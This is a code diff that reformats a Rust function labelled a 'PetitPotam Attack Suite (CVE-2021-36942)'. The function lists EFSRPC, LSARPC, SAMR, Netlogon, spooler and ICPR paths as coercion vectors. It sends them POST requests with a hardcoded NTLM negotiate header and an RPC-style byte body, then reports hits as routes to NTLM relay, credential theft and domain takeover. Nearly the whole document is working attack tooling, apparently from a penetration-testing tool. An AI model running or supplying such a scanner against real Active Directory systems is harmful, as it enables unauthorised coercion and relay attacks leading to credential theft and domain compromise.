@@ -34,20 +34,41 @@ const AD_ENDPOINTS: &[(&str, &str)] = &[
 ];
 
 const PETITPOTAM_PAYLOADS: &[(&str, &str)] = &[
-    ("EFSRPC — OpenEncryptedFileRaw", "/efs/rpc/OpenEncryptedFileRaw"),
+    (
+        "EFSRPC — OpenEncryptedFileRaw",
+        "/efs/rpc/OpenEncryptedFileRaw",
+    ),
     ("EFSRPC — EncryptFileRaw", "/efs/rpc/EncryptFileRaw"),
-    ("EFSRPC — QueryRecoveryAgents", "/efs/rpc/QueryRecoveryAgents"),
+    (
+        "EFSRPC — QueryRecoveryAgents",
+        "/efs/rpc/QueryRecoveryAgents",
+    ),
     ("EFSRPC — EfsRpcOpenFileRaw", "/efs/rpc/EfsRpcOpenFileRaw"),
     ("LSARPC — LSARPC", "/lsarpc/lsass"),
     ("LSARPC — MS-EFSR", "/lsarpc/MsEfsr"),
     ("SAMR — SamrConnect", "/samr/samr"),
-    ("Netlogon — NetrServerReqChallenge", "/netlogon/netrserverreqchallenge"),
+    (
+        "Netlogon — NetrServerReqChallenge",
+        "/netlogon/netrserverreqchallenge",
+    ),
     ("Print — RpcAddPrinter", "/spoolss/rpcaddprinter"),
     ("ICPR — RequestCertificate", "/icpr/requestcertificate"),
-    ("EFSPipe — EfsRpcEncryptFileRawSrv", "/efsrpc/EfsRpcEncryptFileRawSrv"),
-    ("EFSPipe — EfsRpcDecryptFileRawSrv", "/efsrpc/EfsRpcDecryptFileRawSrv"),
-    ("EFSPipe — EfsRpcQueryUsersOnFile", "/efsrpc/EfsRpcQueryUsersOnFile"),
-    ("EFSPipe — EfsRpcAddUsersToFile", "/efsrpc/EfsRpcAddUsersToFile"),
+    (
+        "EFSPipe — EfsRpcEncryptFileRawSrv",
+        "/efsrpc/EfsRpcEncryptFileRawSrv",
+    ),
+    (
+        "EFSPipe — EfsRpcDecryptFileRawSrv",
+        "/efsrpc/EfsRpcDecryptFileRawSrv",
+    ),
+    (
+        "EFSPipe — EfsRpcQueryUsersOnFile",
+        "/efsrpc/EfsRpcQueryUsersOnFile",
+    ),
+    (
+        "EFSPipe — EfsRpcAddUsersToFile",
+        "/efsrpc/EfsRpcAddUsersToFile",
+    ),
     ("SMB named pipe — lsarpc", "/pipe/lsarpc"),
     ("SMB named pipe — efsrpc", "/pipe/efsrpc"),
     ("SMB named pipe — samr", "/pipe/samr"),
@@ -57,10 +78,18 @@ const PETITPOTAM_PAYLOADS: &[(&str, &str)] = &[
 ];
 
 pub async fn petitpotam(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
-    println!("{} PetitPotam Attack Suite (CVE-2021-36942)", "[*]".cyan().bold());
+    println!(
+        "{} PetitPotam Attack Suite (CVE-2021-36942)",
+        "[*]".cyan().bold()
+    );
     println!("{}", "=".repeat(60).cyan());
     println!("{} URL: {}", "[*]".cyan().bold(), url);
-    println!("{} {} endpoint probes, {} PetitPotam vectors", "[*]".cyan().bold(), AD_ENDPOINTS.len(), PETITPOTAM_PAYLOADS.len());
+    println!(
+        "{} {} endpoint probes, {} PetitPotam vectors",
+        "[*]".cyan().bold(),
+        AD_ENDPOINTS.len(),
+        PETITPOTAM_PAYLOADS.len()
+    );
     println!("{}", "-".repeat(60).dimmed());
 
     let client = build_client(timeout, token);
@@ -97,24 +126,37 @@ pub async fn petitpotam(url: &str, token: Option<&str>, timeout: u64) -> anyhow:
         }
     }
 
-    println!("\n{} [2/2] PetitPotam NTLM relay vectors...", "[*]".cyan().bold());
-    println!("  {} Testing {} coercion vectors...", "*".cyan(), PETITPOTAM_PAYLOADS.len());
+    println!(
+        "\n{} [2/2] PetitPotam NTLM relay vectors...",
+        "[*]".cyan().bold()
+    );
+    println!(
+        "  {} Testing {} coercion vectors...",
+        "*".cyan(),
+        PETITPOTAM_PAYLOADS.len()
+    );
     let mut results = Vec::new();
 
     for (name, path) in PETITPOTAM_PAYLOADS {
         let target = format!("{}{}", base, path);
         let ntlm_auth = "NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==";
 
-        match client.post(&target)
+        match client
+            .post(&target)
             .header("Authorization", ntlm_auth)
             .header("Content-Type", "application/octet-stream")
-            .body(format!("\x05\x00\x0b\x03\x10\x00\x00\x00{}\x00\x00\x00", path))
+            .body(format!(
+                "\x05\x00\x0b\x03\x10\x00\x00\x00{}\x00\x00\x00",
+                path
+            ))
             .send()
             .await
         {
             Ok(resp) => {
                 let status = resp.status().as_u16();
-                let www_auth = resp.headers().get("www-authenticate")
+                let www_auth = resp
+                    .headers()
+                    .get("www-authenticate")
                     .map(|v| v.to_str().unwrap_or("").to_string())
                     .unwrap_or_default();
                 let body = resp.text().await.unwrap_or_default();
@@ -148,7 +190,12 @@ pub async fn petitpotam(url: &str, token: Option<&str>, timeout: u64) -> anyhow:
                 }
             }
             Err(_) => {
-                println!("  {} [{:02}] {:40} error", "*".red(), results.len() + 1, name);
+                println!(
+                    "  {} [{:02}] {:40} error",
+                    "*".red(),
+                    results.len() + 1,
+                    name
+                );
             }
         }
     }
@@ -162,20 +209,38 @@ pub async fn petitpotam(url: &str, token: Option<&str>, timeout: u64) -> anyhow:
     );
 
     if !results.is_empty() {
-        let has_efs = results.iter().any(|n| n.contains("EFS") || n.contains("efs"));
-        let has_lsa = results.iter().any(|n| n.contains("LSA") || n.contains("lsa"));
-        let has_icpr = results.iter().any(|n| n.contains("ICPR") || n.contains("icpr"));
+        let has_efs = results
+            .iter()
+            .any(|n| n.contains("EFS") || n.contains("efs"));
+        let has_lsa = results
+            .iter()
+            .any(|n| n.contains("LSA") || n.contains("lsa"));
+        let has_icpr = results
+            .iter()
+            .any(|n| n.contains("ICPR") || n.contains("icpr"));
         if has_efs {
-            println!("{} [CRITICAL] EFSRPC coercion — NTLM relay to AD CS for domain takeover!", "[!]".red().bold());
+            println!(
+                "{} [CRITICAL] EFSRPC coercion — NTLM relay to AD CS for domain takeover!",
+                "[!]".red().bold()
+            );
         }
         if has_lsa {
-            println!("{} [HIGH] LSARPC coercion — NTLM relay for credential theft!", "[!]".red().bold());
+            println!(
+                "{} [HIGH] LSARPC coercion — NTLM relay for credential theft!",
+                "[!]".red().bold()
+            );
         }
         if has_icpr {
-            println!("{} [CRITICAL] ICPR coercion — direct NTLM relay to CA for cert enrollment!", "[!]".red().bold());
+            println!(
+                "{} [CRITICAL] ICPR coercion — direct NTLM relay to CA for cert enrollment!",
+                "[!]".red().bold()
+            );
         }
     } else {
-        println!("{} No PetitPotam vulnerabilities detected.", "[-]".green().bold());
+        println!(
+            "{} No PetitPotam vulnerabilities detected.",
+            "[-]".green().bold()
+        );
     }
 
     Ok(())
